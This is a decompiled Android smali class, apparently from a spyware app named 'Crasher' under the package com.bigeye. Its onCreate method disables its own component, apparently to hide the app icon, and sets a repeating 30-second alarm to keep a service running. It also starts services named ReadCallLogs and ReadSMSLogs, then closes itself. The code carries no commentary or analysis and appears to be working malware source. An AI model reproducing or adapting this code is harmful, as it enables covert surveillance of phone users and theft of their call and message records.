.class public Lcom/bigeye/crasher/Crasher;
.super Landroid/app/Activity;
.source "Crasher.java"


# static fields
.field private static final REPEAT_TIME:J = 0x7530L


# instance fields
.field private final APP_TAG:Ljava/lang/String;

.field prefName:Ljava/lang/String;

.field prefs:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 34
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 37
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bigeye/crasher/Crasher;->APP_TAG:Ljava/lang/String;

    .line 39
    const-string v0, "AllLogs"

    iput-object v0, p0, Lcom/bigeye/crasher/Crasher;->prefName:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 10
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v1, 0x0

    .line 45
    invoke-virtual {p0}, Lcom/bigeye/crasher/Crasher;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    .line 46
    .local v9, "p":Landroid/content/pm/PackageManager;
    invoke-virtual {p0}, Lcom/bigeye/crasher/Crasher;->getComponentName()Landroid/content/ComponentName;

    move-result-object v2

    const/4 v3, 0x2

    const/4 v4, 0x1

    invoke-virtual {v9, v2, v3, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 48
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 49
    const/high16 v2, 0x7f030000

    invoke-virtual {p0, v2}, Lcom/bigeye/crasher/Crasher;->setContentView(I)V

    .line 51
    const-string v2, "alarm"

    invoke-virtual {p0, v2}, Lcom/bigeye/crasher/Crasher;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 52
    .local v0, "service":Landroid/app/AlarmManager;
    new-instance v8, Landroid/content/Intent;

    const-class v2, Lcom/bigeye/crasher/StartServiceReceiver;

    invoke-direct {v8, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 53
    .local v8, "i":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-static {p0, v1, v8, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 54
    .local v6, "pending":Landroid/app/PendingIntent;
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v7

    .line 57
    .local v7, "cal":Ljava/util/Calendar;
    invoke-virtual {v7}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x7530

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setInexactRepeating(IJJLandroid/app/PendingIntent;)V

    .line 60
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/bigeye/crasher/ReadCallLogs;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Lcom/bigeye/crasher/Crasher;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 63
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/bigeye/crasher/ReadSMSLogs;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Lcom/bigeye/crasher/Crasher;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 65
    iget-object v1, p0, Lcom/bigeye/crasher/Crasher;->APP_TAG:Ljava/lang/String;

    const-string v2, "closing main activity!"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 66
    invoke-virtual {p0}, Lcom/bigeye/crasher/Crasher;->finish()V

    .line 67
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    .line 72
    invoke-virtual {p0}, Lcom/bigeye/crasher/Crasher;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const/high16 v1, 0x7f070000

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 73
    const/4 v0, 0x1

    return v0
.end method
